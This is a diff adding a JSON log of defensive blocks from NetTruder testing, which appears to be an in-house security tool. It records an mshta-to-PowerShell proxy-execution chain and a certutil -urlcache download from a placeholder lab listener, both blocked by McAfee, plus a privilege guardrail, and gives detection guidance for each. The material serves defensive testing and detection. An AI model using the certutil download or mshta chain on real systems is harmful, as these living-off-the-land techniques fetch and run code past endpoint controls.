@@ -1,0 +1,84 @@
+{
+  "version": "2026.11.3",
+  "updated": "2026-11-15",
+  "note": "Observed defensive blocks from NetTruder testing. Each entry is a test vector that was refused by an endpoint control or by a NetTruder guardrail. A block is a positive control result, not a coverage pass: it says nothing about the variants that were not attempted. None of these tests was bypassed.",
+  "kinds": {
+    "endpoint-av": "An endpoint security product refused the process or its content.",
+    "policy": "An operating-system or enterprise policy refused the action.",
+    "guardrail": "NetTruder refused its own action because a privilege or target-safety rule was not met."
+  },
+  "blocks": [
+    {
+      "id": "BLOCK-001",
+      "tech": "T1218.005",
+      "technique": "Mshta",
+      "host": "mshta.exe",
+      "kind": "endpoint-av",
+      "product": "McAfee endpoint, registered alongside Windows Defender",
+      "date": "2026-11-13",
+      "vector": "HTA script host launches PowerShell directly",
+      "cmd": "mshta.exe -> Wsh.Run(powershell.exe -Command \"exit 0\")",
+      "result": "Blocked before process start; no engine events were produced.",
+      "signal": "HRESULT -2147024671 = 0x800700E1 ERROR_VIRUS_INFECTED",
+      "scope": "Parent-sensitive. The same command from cscript succeeded, so the path and arguments were valid. The control keyed on the mshta parent plus the child command line, not on powershell.exe alone.",
+      "valid": "The endpoint control refused a script host starting a shell, which is the behaviour the mshta technique depends on. A refusal here is the control working, not a broken test.",
+      "teaches": "Test proxy execution as a parent/child chain, not as a standalone binary. A valid Microsoft signature on mshta.exe does not mean the child process will be allowed.",
+      "detect": "4688 or Sysmon 1 where ParentImage ends in mshta.exe and Image ends in powershell.exe or cmd.exe. Alert on the chain, not only on the child command line.",
+      "followup": "Keep the allowed control (cmd /c echo hi) in the test matrix so a block is never confused with a broken harness. Add the mshta-to-shell chain to the ASR and parent-image guidance.",
+      "variants": [
+        { "cmd": "powershell.exe -Command \"exit 0\"", "result": "blocked 0x800700E1" },
+        { "cmd": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"exit 0\"", "result": "blocked" },
+        { "cmd": "cmd.exe /c powershell.exe -Command \"exit 0\"", "result": "blocked" },
+        { "cmd": "cmd.exe /c echo hi", "result": "allowed - control vector" },
+        { "cmd": "wscript.exe engine\\shim.vbs request.json", "result": "allowed - replacement chain" }
+      ],
+      "evidence": "RESEARCH.md section 4. The allow/deny matrix was run on 2026-11-13 and recorded in the read-out; the error code was read from the Wsh.Run HRESULT."
+    },
+    {
+      "id": "BLOCK-002",
+      "tech": "T1140",
+      "technique": "Certutil",
+      "host": "certutil.exe",
+      "kind": "endpoint-av",
+      "product": "McAfee endpoint, registered alongside Windows Defender",
+      "date": "2026-11-15",
+      "vector": "certutil URL cache download",
+      "cmd": "certutil.exe -urlcache -split -f http://<lab-listener>/sample.txt %TEMP%\\nw-sample.txt",
+      "result": "Refused at process start. No download completed and no egress alert was raised because the process never reached the network.",
+      "signal": "McAfee notification: file contains a virus or potentially unwanted software",
+      "scope": "The command shape is exact; the original URL and temp path were not retained in a machine log, so this is a documented test vector rather than a byte-for-byte replay.",
+      "valid": "The endpoint control refused a signed system binary using the documented download arguments before it could touch the network. That is exactly the outcome a download-control test is meant to observe.",
+      "teaches": "AV content and behaviour rules can cover a LOLBAS vector before the network layer does. A missing EGRESS_CERTUTIL alert is not an IDS miss when the process was never created; check the endpoint product log before calling it a gap.",
+      "detect": "certutil with -urlcache, -split, -verifyctl, -decode, -encode or a URL. Correlate with endpoint product events 1116/1117 (Defender) or the McAfee event log, and with 4688/Sysmon 1 if available.",
+      "followup": "Record the endpoint verdict alongside the IDS verdict. Add a report line that separates 'blocked before execution' from 'executed but not observed'.",
+      "variants": [
+        { "cmd": "certutil.exe -urlcache -split -f <url> <temp-file>", "result": "blocked by McAfee at process start" },
+        { "cmd": "certutil.exe -hashfile <local-file> SHA256", "result": "not tested - normal certificate use, outside the download test" }
+      ],
+      "evidence": "RESEARCH.md section 10.4. Recorded as prose during the egress test; no machine log captured the argv or the McAfee event id."
+    },
+    {
+      "id": "BLOCK-003",
+      "tech": "GUARD-IPS",
+      "technique": "IPS privilege and target guard",
+      "host": "NetTruder IPS",
+      "kind": "guardrail",
+      "product": "NetTruder firewall guard",
+      "date": "2026-11-13",
+      "vector": "Block a public address without elevation",
+      "cmd": "NetTruder.ps1 -Action block 8.8.8.8 (standard user); UI BLOCK 8.8.8.8",
+      "result": "Refused. The console reported that an elevated session is required and created zero firewall rules.",
+      "signal": "Elevation check failed before New-NetFirewallRule was called.",
+      "scope": "Also enforced in code: local address, gateway, DNS server, loopback, multicast, broadcast and reserved ranges are refused, and private peers need explicit confirmation.",
+      "valid": "A network containment tool must not be able to cut off its own management path or a public service without authority. Refusing is the safer and correct behaviour.",
+      "teaches": "Not every blocked command is an AV result. Separate product blocks, policy blocks and self-guardrails in the report so an operator knows which control acted.",
+      "detect": "Audit entry for the refused block attempt, plus the console message. No firewall rule should exist afterwards.",
+      "followup": "Add an audit assertion to the test plan: after a refused block, NetTruder-IPS-* rule count must still be zero.",
+      "variants": [
+        { "cmd": "CLI block as standard user", "result": "refused, 0 rules" },
+        { "cmd": "UI block as standard user", "result": "refused, 0 rules" }
+      ],
+      "evidence": "RESEARCH.md section 3, verified results table."
+    }
+  ]
+}
